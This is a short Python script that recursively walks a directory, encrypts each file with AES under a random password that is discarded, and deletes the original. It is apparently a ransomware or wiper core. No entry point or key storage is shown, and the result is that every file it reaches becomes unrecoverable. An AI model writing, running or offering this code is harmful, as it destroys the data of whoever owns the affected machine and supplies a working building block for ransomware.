import pyAesCrypt
import os
import sys
import secrets
import threading
def rand_pass():
    return secrets.token_hex(13)
def crypt(file, password):
    pyAesCrypt.encryptFile(str(file), str(file) + ".aes", password)
    os.remove(file)

def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            crypt(path, rand_pass())
        else:
            walk(path)
